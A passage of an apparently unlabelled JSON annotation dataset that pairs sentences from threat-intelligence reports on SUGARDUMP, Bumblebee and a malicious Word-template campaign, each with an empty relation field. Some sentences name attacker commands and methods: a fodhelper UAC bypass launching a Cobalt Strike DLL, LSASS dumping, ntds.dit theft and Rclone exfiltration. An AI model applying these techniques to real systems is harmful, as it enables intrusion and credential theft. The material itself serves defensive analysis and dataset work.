        "S1": "Like previous versions, this version of SUGARDUMP harvests credentials from Chromium-based browsers Chrome, Opera and Edge.",
        "S2": "The .NET project for this version of SUGARDUMP was named \"yaal\", which is the Farsi word for a horse\u2019s mane.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S91<=>S94",
        "S1": "The collected data is subsequently encrypted using AES encryption using Cipher Block Chaining (CBC) mode.",
        "S2": "After the encryption process, the data is also encoded using Base64, and subsequently sent over HTTP to an UNC3890 C2 server: 144.202.123[.]248:80.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S92<=>S96",
        "S1": "The encryption key is the Sha256 of an embedded password: \u201c1qazXSW@3edc123456be name KHODA 110 !!)1qazXSW@3edc\u201d.",
        "S2": "This, along with the use of the word \u201cKHODA\u201d in SUGARDUMP\u2019s encryption key, may strengthen the possibility that the developers of SUGARDUMP are Farsi speakers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S93<=>S95",
        "S1": "The word \u201cKHODA\u201d means god in Farsi.",
        "S2": "The .NET project for this version of SUGARDUMP was named \"yaal\", which is the Farsi word for a horse\u2019s mane.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md::S93<=>S96",
        "S1": "The word \u201cKHODA\u201d means god in Farsi.",
        "S2": "This, along with the use of the word \u201cKHODA\u201d in SUGARDUMP\u2019s encryption key, may strengthen the possibility that the developers of SUGARDUMP are Farsi speakers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S0<=>S3",
        "S1": "Cybereason GSOC team observed the following distribution method to deliver the Bumblebee malware:",
        "S2": "- The content of the mounted ISO image is a LNK file executing the Bumblebee payload upon user interaction:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S3<=>S5",
        "S1": "- The content of the mounted ISO image is a LNK file executing the Bumblebee payload upon user interaction:",
        "S2": "To infect the system, an end-user has to first manually decompress the archive containing the ISO file, mount the file and then execute the Windows shortcut (LNK).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S4<=>S7",
        "S1": "Bumblebee operators host malicious websites that implement a drive-by download.",
        "S2": "The file [Bumblebee specific name].rsp has the reference to the Bumblebee DLL:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S5<=>S16",
        "S1": "To infect the system, an end-user has to first manually decompress the archive containing the ISO file, mount the file and then execute the Windows shortcut (LNK).",
        "S2": "- wabmig.exe (Microsoft contacts import tool) with injected Meterpreter agent code (Meterpreter agent is a security product used for penetration testing and provides remote control capabilities).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S7<=>S11",
        "S1": "The file [Bumblebee specific name].rsp has the reference to the Bumblebee DLL:",
        "S2": "Bumblebee DLL is executed using odbcconf.exe -f [Bumblebee specific name].rsp in the LNK file target property.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S13<=>S18",
        "S1": "After the initial infection, Bumblebee injects code into multiple processes in order to establish a strong foothold on infected endpoints.",
        "S2": "Bumblebee performs privilege escalation by loading an exploit for CVE-2020-1472 (Zerologon) into rundll32.exe:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S17<=>S20",
        "S1": "- wab.exe (Microsoft address book application) with an injected Cobalt Strike beacon:",
        "S2": "The method uses fodhelper.exe which is a trusted binary, meaning Windows 10 won't show a UAC window when launched into execution:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S18<=>S21",
        "S1": "Bumblebee performs privilege escalation by loading an exploit for CVE-2020-1472 (Zerologon) into rundll32.exe:",
        "S2": "Fodhelper.exe is used to run \"cmd.exe\" /c rundll32.exe C:\\ProgramData\\Cisco\\[Cobalt strike].dll\u201d,MainProc where [Cobalt strike].dll is a Cobalt Strike framework beacon and MainProc is the exported function to run.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S19<=>S25",
        "S1": "Bumblebee uses a User Account Control (UAC) bypass technique to deploy post exploitation tools with elevated privileges on infected machines.",
        "S2": "After obtaining system privileges on the infected machine, Bumblebee performs credential theft using two methods detailed below.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S20<=>S27",
        "S1": "The method uses fodhelper.exe which is a trusted binary, meaning Windows 10 won't show a UAC window when launched into execution:",
        "S2": "On Windows systems domain, local usernames and passwords are stored in the memory space of the LSASS process.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S25<=>S28",
        "S1": "After obtaining system privileges on the infected machine, Bumblebee performs credential theft using two methods detailed below.",
        "S2": "Bumblebee dumps the memory of this process using procdump64.exe to access the sensitive information:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S27<=>S31",
        "S1": "On Windows systems domain, local usernames and passwords are stored in the memory space of the LSASS process.",
        "S2": "The Security Account Manager (SAM) database is where Windows stores information about user accounts.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S29<=>S34",
        "S1": "The second method of credential theft that Bumblebee operators use is registry hive extraction using reg.exe:",
        "S2": "Bumblebee operators :",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S30<=>S33",
        "S1": "- HKLM SAM:",
        "S2": "- HKLM System: Contains keys that could be used to decrypt/encrypt the LSA secret and SAM database:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S34<=>S37",
        "S1": "Bumblebee operators :",
        "S2": "- Exfiltrate it over their network tunnel:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S34<=>S38",
        "S1": "Bumblebee operators :",
        "S2": "Bumblebee operators process retrieved credentials offline, attempting to extract cleartext passwords.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S38<=>S43",
        "S1": "Bumblebee operators process retrieved credentials offline, attempting to extract cleartext passwords.",
        "S2": "AdFind (named \u201caf.exe\u201d) is a publicly available tool for querying Active Directory and has been used by multiple threat actors:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S40<=>S42",
        "S1": "After the attackers gain a foothold in the organization network, they gather information in various ways.",
        "S2": "The attackers collect information such as the domain names, users, hosts and domain controllers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S41<=>S43",
        "S1": "We have observed attackers using tools such as nltest, ping, netview, tasklist and Adfind to collect wide information related to the organization.",
        "S2": "AdFind (named \u201caf.exe\u201d) is a publicly available tool for querying Active Directory and has been used by multiple threat actors:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S41<=>S44",
        "S1": "We have observed attackers using tools such as nltest, ping, netview, tasklist and Adfind to collect wide information related to the organization.",
        "S2": "During the reconnaissance phase, Bumblebee operators contacted more than 200 IP addresses and domain names within the organization.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S44<=>S47",
        "S1": "During the reconnaissance phase, Bumblebee operators contacted more than 200 IP addresses and domain names within the organization.",
        "S2": "Bumblebee uses a Cobalt Strike agent for lateral movement.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S46<=>S50",
        "S1": "The following table summarizes the reconnaissance commands observed by Cybereason GSOC analysts:",
        "S2": "Bumblebee operators using Anydesk for lateral movement as seen in the Cybereason Defense Platform",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S47<=>S49",
        "S1": "Bumblebee uses a Cobalt Strike agent for lateral movement.",
        "S2": "Following the lateral movement, the attacker persists on the organization network using the remote management software \u201cany desk\u201d:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S47<=>S50",
        "S1": "Bumblebee uses a Cobalt Strike agent for lateral movement.",
        "S2": "Bumblebee operators using Anydesk for lateral movement as seen in the Cybereason Defense Platform",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S50<=>S53",
        "S1": "Bumblebee operators using Anydesk for lateral movement as seen in the Cybereason Defense Platform",
        "S2": "Bumblebee accesses the remote Active Directory machines using Windows Management Instrumentation command-line utility (WMIC) and creates a shadow copy using vssadmin command.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S51<=>S54",
        "S1": "After the attacker obtains a highly privileged user and its password, the attacker accesses the shadow copy.",
        "S2": "In addition, the attacker steals the ntds.dit file from the domain controller.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S53<=>S55",
        "S1": "Bumblebee accesses the remote Active Directory machines using Windows Management Instrumentation command-line utility (WMIC) and creates a shadow copy using vssadmin command.",
        "S2": "The ntds.dit file is a database that stores Active Directory data, including information about user objects, groups and group membership.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S55<=>S57",
        "S1": "The ntds.dit file is a database that stores Active Directory data, including information about user objects, groups and group membership.",
        "S2": "The following are the commands related to credential theft used to escalate privileges on the Active Directory:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S56<=>S58",
        "S1": "The file also stores the password hashes for all users in the domain:",
        "S2": "In order to obtain maximum privileges on the Active Directory domain, the threat actor:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S58<=>S61",
        "S1": "In order to obtain maximum privileges on the Active Directory domain, the threat actor:",
        "S2": "- Copies the Active Directory database (ntds.dit) as well as registry hives containing credentials and sensitive data from the shadow copy.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S58<=>S63",
        "S1": "In order to obtain maximum privileges on the Active Directory domain, the threat actor:",
        "S2": "The threat actor uses a domain administrator account obtained previously to move laterally on multiple systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S59<=>S61",
        "S1": "- Creates a shadow copy of the machine file\u2019s volume",
        "S2": "- Copies the Active Directory database (ntds.dit) as well as registry hives containing credentials and sensitive data from the shadow copy.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1177.md::S64<=>S68",
        "S1": "After initial connection, they create a local user and exfiltrate data using Rclone software.",
        "S2": "The rclone.exe process transfers approximately 50 GB of data to an endpoint with an IP address over TCP port 22 (SSH), which is located in the United States.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S0<=>S3",
        "S1": "This recent campaign used malicious documents to install malware on the targeted system using a template injection attack.",
        "S2": "Further, these malicious Word documents contained content related to legitimate jobs at these leading defense contractors.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S1<=>S3",
        "S1": "This technique allows a weaponized document to download an external Word template containing macros that will be executed.",
        "S2": "Further, these malicious Word documents contained content related to legitimate jobs at these leading defense contractors.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S2<=>S9",
        "S1": "This is a known trick used to bypass static malicious document analysis, as well as detection, as the macros are embedded in the downloaded template.",
        "S2": "As we mentioned, the adversary used a technique called template injection.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S3<=>S5",
        "S1": "Further, these malicious Word documents contained content related to legitimate jobs at these leading defense contractors.",
        "S2": "The timeline for these documents, that were sent to an unknown number of targets, ran between 31 March and 18 May 2020.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S9<=>S12",
        "S1": "As we mentioned, the adversary used a technique called template injection.",
        "S2": "Using the template injection technique, the adversary puts a link towards the template file in one of the .XML files, for example the link is in settings.xml.rels while the external oleobject load is in document.xml.rels.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S10<=>S18",
        "S1": "When a document contains the .docx extension, in our case, it means that we are dealing with the Open Office XML standard.",
        "S2": "We mentioned earlier that docx files (like xlsx and pptx) are part of the OOXML standard.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S12<=>S51",
        "S1": "Using the template injection technique, the adversary puts a link towards the template file in one of the .XML files, for example the link is in settings.xml.rels while the external oleobject load is in document.xml.rels.",
        "S2": "Further analysis of these documents, based on metadata information, indicated that they contained relationships to the primary documents created by the adversary.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S12<=>S14",
        "S1": "Using the template injection technique, the adversary puts a link towards the template file in one of the .XML files, for example the link is in settings.xml.rels while the external oleobject load is in document.xml.rels.",
        "S2": "This is a clever technique we observe being used by multiple adversaries [5] and is intended to make a document appear to be clean initially, only to subsequently load malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S14<=>S42",
        "S1": "This is a clever technique we observe being used by multiple adversaries [5] and is intended to make a document appear to be clean initially, only to subsequently load malware.",
        "S2": "Digging into more values and metadata (we are aware they can be manipulated), we created the following overview in chronological order based on the creation date:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S17<=>S25",
        "S1": "Current McAfee technologies currently protect against this threat.",
        "S2": "According to the Microsoft documentation, w15 defines the PersistentDocumentId Class.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S21<=>S24",
        "S1": "This file contains settings with regards to language, markup and more.",
        "S2": "The XML file ends with a GUID value that starts with the value \u201cw15\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S24<=>S34",
        "S1": "The XML file ends with a GUID value that starts with the value \u201cw15\u201d.",
        "S2": "To add to this assertion; in the settings.xml file the value \u201crsid\u201d (Revision Identifier for Style Definition) can be found.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S25<=>S27",
        "S1": "According to the Microsoft documentation, w15 defines the PersistentDocumentId Class.",
        "S2": "The 128-bit GUID is set as an ST_Guid attribute which, according to the Microsoft documentation, refers to a unique token.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S25<=>S28",
        "S1": "According to the Microsoft documentation, w15 defines the PersistentDocumentId Class.",
        "S2": "The used class generates a GUID for use as the DocID and generates the associated key.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S26<=>S44",
        "S1": "When the object is serialized out as xml, its qualified name is w15:docId.",
        "S2": "The revision number indicates the possible changes in the document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S27<=>S35",
        "S1": "The 128-bit GUID is set as an ST_Guid attribute which, according to the Microsoft documentation, refers to a unique token.",
        "S2": "According to Microsoft\u2019s documentation: \u201cThis element specifies a unique four-digit number which shall be used to determine the editing session in which this style definition was last modified.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S34<=>S72",
        "S1": "To add to this assertion; in the settings.xml file the value \u201crsid\u201d (Revision Identifier for Style Definition) can be found.",
        "S2": "These DOTM files exist on remote servers compromised by the adversary; the first stage document contains an embedded link that refers to the location of this file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S35<=>S70",
        "S1": "According to Microsoft\u2019s documentation: \u201cThis element specifies a unique four-digit number which shall be used to determine the editing session in which this style definition was last modified.",
        "S2": "The DOTM (Office template filetype) files are responsible for loading the patched DLLs onto the victim\u2019s machine to collect and gather data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S41<=>S81",
        "S1": "This indicates that these documents, although they are now separate, originated from the same document.",
        "S2": "If we compare the original library within the extracted DLL, we can spot lot of similarities across the two samples:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S42<=>S48",
        "S1": "Digging into more values and metadata (we are aware they can be manipulated), we created the following overview in chronological order based on the creation date:",
        "S2": "There were several documents flagged as non-malicious discovered during our investigation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S48<=>S74",
        "S1": "There were several documents flagged as non-malicious discovered during our investigation.",
        "S2": "Based on our analysis, these DLLs were first seen on 20 April 2020 and, to our knowledge based on age and prevalence data, these implants have been customized for this attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S48<=>S66",
        "S1": "There were several documents flagged as non-malicious discovered during our investigation.",
        "S2": "In this campaign the adversary was utilizing patched SQL Lite DLLs to gather basic information from its targets.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S51<=>S58",
        "S1": "Further analysis of these documents, based on metadata information, indicated that they contained relationships to the primary documents created by the adversary.",
        "S2": "The PDFs were discovered in an archive file indicating that LinkedIn may have been a possible vector utilized by the adversaries to target victims.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S52<=>S55",
        "S1": "Two PDF files (***_SPE_LEOS and ***_HPC_SE) with aerospace & defense industry themed images, created via the Microsoft Print to PDF service, were submitted along with ***_ECS_EPM.docx.",
        "S2": "The Microsoft Print to PDF service enables content from a Microsoft Word document be printed to PDF directly.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S52<=>S82",
        "S1": "Two PDF files (***_SPE_LEOS and ***_HPC_SE) with aerospace & defense industry themed images, created via the Microsoft Print to PDF service, were submitted along with ***_ECS_EPM.docx.",
        "S2": "As mentioned, the patched DLL and the original SQLITE library share a lot of code:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S53<=>S56",
        "S1": "The naming convention of these PDF files was very similar to the malicious documents used.",
        "S2": "In this case these two PDF files were generated from an original Microsoft Word document with the author \u2018HOME\u2019.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S56<=>S58",
        "S1": "In this case these two PDF files were generated from an original Microsoft Word document with the author \u2018HOME\u2019.",
        "S2": "The PDFs were discovered in an archive file indicating that LinkedIn may have been a possible vector utilized by the adversaries to target victims.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S58<=>S64",
        "S1": "The PDFs were discovered in an archive file indicating that LinkedIn may have been a possible vector utilized by the adversaries to target victims.",
        "S2": "The adversary used malicious DLL files, delivered through stage 2 malicious documents, to spy on targets.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S60<=>S62",
        "S1": "Digging into the remote template files reveals some additional insight concerning the structure of the macro code.",
        "S2": "The content is all encoded in UserForm1 in the remote DOTM file that is extracted by the macro code.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S61<=>S80",
        "S1": "The second stage remote document template files contain Visual Basic macro code designed to extract a double base64 encoded DLL implant.",
        "S2": "Analyzing the sample statically, it was possible to extract the legitimate software used to store the implant, for example, one of the DLL files extracted from the DOTM files was a patched SQLITE library.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S64<=>S66",
        "S1": "The adversary used malicious DLL files, delivered through stage 2 malicious documents, to spy on targets.",
        "S2": "In this campaign the adversary was utilizing patched SQL Lite DLLs to gather basic information from its targets.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S65<=>S67",
        "S1": "Those malicious documents were designed to drop DLL implants on the victim\u2019s machine to collect initial intelligence.",
        "S2": "These DLLs were modified to include malicious code to be executed on the victim\u2019s machine when they\u2019re invoked under certain circumstances.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S66<=>S72",
        "S1": "In this campaign the adversary was utilizing patched SQL Lite DLLs to gather basic information from its targets.",
        "S2": "These DOTM files exist on remote servers compromised by the adversary; the first stage document contains an embedded link that refers to the location of this file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S66<=>S74",
        "S1": "In this campaign the adversary was utilizing patched SQL Lite DLLs to gather basic information from its targets.",
        "S2": "Based on our analysis, these DLLs were first seen on 20 April 2020 and, to our knowledge based on age and prevalence data, these implants have been customized for this attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S68<=>S70",
        "S1": "The purpose of these DLLs is/was to gather machine information from infected victims that could be used to further identify more interesting targets.",
        "S2": "The DOTM (Office template filetype) files are responsible for loading the patched DLLs onto the victim\u2019s machine to collect and gather data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S70<=>S73",
        "S1": "The DOTM (Office template filetype) files are responsible for loading the patched DLLs onto the victim\u2019s machine to collect and gather data.",
        "S2": "When the victim opens the document, the remote DOTM file that contains a Visual Basic macro code to load malicious DLLs, is loaded.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S70<=>S74",
        "S1": "The DOTM (Office template filetype) files are responsible for loading the patched DLLs onto the victim\u2019s machine to collect and gather data.",
        "S2": "Based on our analysis, these DLLs were first seen on 20 April 2020 and, to our knowledge based on age and prevalence data, these implants have been customized for this attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S70<=>S76",
        "S1": "The DOTM (Office template filetype) files are responsible for loading the patched DLLs onto the victim\u2019s machine to collect and gather data.",
        "S2": "To identify the malicious DLLs that will load or download the final implant, we extracted from the Office files found in the triage phase, the following DLL files:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S72<=>S77",
        "S1": "These DOTM files exist on remote servers compromised by the adversary; the first stage document contains an embedded link that refers to the location of this file.",
        "S2": "These DLL files are patched versions from goodware libraries, like the SQLITE library found in our analysis, and are loaded via a VBScript contained within the DOTM files that loads a double Base64 encoded DLL as described in this analysis.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S72<=>S107",
        "S1": "These DOTM files exist on remote servers compromised by the adversary; the first stage document contains an embedded link that refers to the location of this file.",
        "S2": "In this case, we observed how, through the use of the Windows API ObtainUserAgentString, the attacker obtained the User-Agent and used the value to connect to the command and control server:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S74<=>S77",
        "S1": "Based on our analysis, these DLLs were first seen on 20 April 2020 and, to our knowledge based on age and prevalence data, these implants have been customized for this attack.",
        "S2": "These DLL files are patched versions from goodware libraries, like the SQLITE library found in our analysis, and are loaded via a VBScript contained within the DOTM files that loads a double Base64 encoded DLL as described in this analysis.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S74<=>S76",
        "S1": "Based on our analysis, these DLLs were first seen on 20 April 2020 and, to our knowledge based on age and prevalence data, these implants have been customized for this attack.",
        "S2": "To identify the malicious DLLs that will load or download the final implant, we extracted from the Office files found in the triage phase, the following DLL files:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S76<=>S84",
        "S1": "To identify the malicious DLLs that will load or download the final implant, we extracted from the Office files found in the triage phase, the following DLL files:",
        "S2": "The macro code of the Office files we analyzed, contained part of these parameters:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S77<=>S79",
        "S1": "These DLL files are patched versions from goodware libraries, like the SQLITE library found in our analysis, and are loaded via a VBScript contained within the DOTM files that loads a double Base64 encoded DLL as described in this analysis.",
        "S2": "From our analysis, we could verify how the DLLs used in the third stage were legitimate software with a malicious implant inside that would be enabled every time a specific function was called with a set of parameters.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S78<=>S80",
        "S1": "The DLL is encoded in UserForm1 (contained within the Microsoft Word macro) and the primary macro code is responsible for extracting and decoded the DLL implant.",
        "S2": "Analyzing the sample statically, it was possible to extract the legitimate software used to store the implant, for example, one of the DLL files extracted from the DOTM files was a patched SQLITE library.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S79<=>S94",
        "S1": "From our analysis, we could verify how the DLLs used in the third stage were legitimate software with a malicious implant inside that would be enabled every time a specific function was called with a set of parameters.",
        "S2": "We focused our analysis into the DLLs files that are unpacked into the system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S79<=>S84",
        "S1": "From our analysis, we could verify how the DLLs used in the third stage were legitimate software with a malicious implant inside that would be enabled every time a specific function was called with a set of parameters.",
        "S2": "The macro code of the Office files we analyzed, contained part of these parameters:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S80<=>S82",
        "S1": "Analyzing the sample statically, it was possible to extract the legitimate software used to store the implant, for example, one of the DLL files extracted from the DOTM files was a patched SQLITE library.",
        "S2": "As mentioned, the patched DLL and the original SQLITE library share a lot of code:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S80<=>S84",
        "S1": "Analyzing the sample statically, it was possible to extract the legitimate software used to store the implant, for example, one of the DLL files extracted from the DOTM files was a patched SQLITE library.",
        "S2": "The macro code of the Office files we analyzed, contained part of these parameters:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S81<=>S97",
        "S1": "If we compare the original library within the extracted DLL, we can spot lot of similarities across the two samples:",
        "S2": "The new DLL implant file will be unpacked (depending of the campaign ID) inside a folder inside the AppData folder of the user in execution:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S81<=>S90",
        "S1": "If we compare the original library within the extracted DLL, we can spot lot of similarities across the two samples:",
        "S2": "The analysis of the DLL extracted from the \u2018docm\u2019 files (the 2nd stage of the infection) revealed the existence of two types of operation for these DLLs:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S83<=>S91",
        "S1": "The first DLL stage needs certain parameters in order to be enabled and launched in the system.",
        "S2": "The DLL unpacks a new payload in the system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S84<=>S95",
        "S1": "The macro code of the Office files we analyzed, contained part of these parameters:",
        "S2": "The DLL implant will be executed after the user interacts by opening the Office file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S84<=>S90",
        "S1": "The macro code of the Office files we analyzed, contained part of these parameters:",
        "S2": "The analysis of the DLL extracted from the \u2018docm\u2019 files (the 2nd stage of the infection) revealed the existence of two types of operation for these DLLs:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S84<=>S94",
        "S1": "The macro code of the Office files we analyzed, contained part of these parameters:",
        "S2": "We focused our analysis into the DLLs files that are unpacked into the system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S84<=>S96",
        "S1": "The macro code of the Office files we analyzed, contained part of these parameters:",
        "S2": "As we explained, the p-code of the VBA macro contains parts of the parameters needed to execute the implant into the system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S85<=>S96",
        "S1": "The data found in the VBA macro had the following details:",
        "S2": "As we explained, the p-code of the VBA macro contains parts of the parameters needed to execute the implant into the system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S92<=>S94",
        "S1": "The DLL downloads a new DLL implant from a remote server delivering an additional DLL payload into the system.",
        "S2": "We focused our analysis into the DLLs files that are unpacked into the system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S93<=>S95",
        "S1": "For both methods, the implant starts collecting the target information and then contacts the command and control (C2) server",
        "S2": "The DLL implant will be executed after the user interacts by opening the Office file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S94<=>S96",
        "S1": "We focused our analysis into the DLLs files that are unpacked into the system.",
        "S2": "As we explained, the p-code of the VBA macro contains parts of the parameters needed to execute the implant into the system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S94<=>S98",
        "S1": "We focused our analysis into the DLLs files that are unpacked into the system.",
        "S2": "The DLL file, must be launched with 5 different parameters if we want to observe the malicious connection within the C2 domain; in our analysis we observed how the DLL was launched with the following command line:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S96<=>S99",
        "S1": "As we explained, the p-code of the VBA macro contains parts of the parameters needed to execute the implant into the system.",
        "S2": "The required parameters to launch the malicious implant are:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S96<=>S108",
        "S1": "As we explained, the p-code of the VBA macro contains parts of the parameters needed to execute the implant into the system.",
        "S2": "If the implant cannot detect the User-Agent in the system, it will use the default Mozilla User-Agent instead:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S96<=>S98",
        "S1": "As we explained, the p-code of the VBA macro contains parts of the parameters needed to execute the implant into the system.",
        "S2": "The DLL file, must be launched with 5 different parameters if we want to observe the malicious connection within the C2 domain; in our analysis we observed how the DLL was launched with the following command line:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S98<=>S110",
        "S1": "The DLL file, must be launched with 5 different parameters if we want to observe the malicious connection within the C2 domain; in our analysis we observed how the DLL was launched with the following command line:",
        "S2": "Unfortunately, during our analysis, the C2 was not active which limited our ability for further analysis.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S98<=>S100",
        "S1": "The DLL file, must be launched with 5 different parameters if we want to observe the malicious connection within the C2 domain; in our analysis we observed how the DLL was launched with the following command line:",
        "S2": "As we explained, the implants are patched SQLITE files",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S99<=>S102",
        "S1": "The required parameters to launch the malicious implant are:",
        "S2": "that is why we could find additional functions that are used to launch the malicious implant, executing the binary with certain parameters.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S100<=>S107",
        "S1": "As we explained, the implants are patched SQLITE files",
        "S2": "In this case, we observed how, through the use of the Windows API ObtainUserAgentString, the attacker obtained the User-Agent and used the value to connect to the command and control server:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S100<=>S102",
        "S1": "As we explained, the implants are patched SQLITE files",
        "S2": "that is why we could find additional functions that are used to launch the malicious implant, executing the binary with certain parameters.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S102<=>S104",
        "S1": "that is why we could find additional functions that are used to launch the malicious implant, executing the binary with certain parameters.",
        "S2": "Analyzing the code statically we could observe that the payload only checks 2 of these 5 parameters but all of them must be present in order to execute the implant:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md::S104<=>S108",
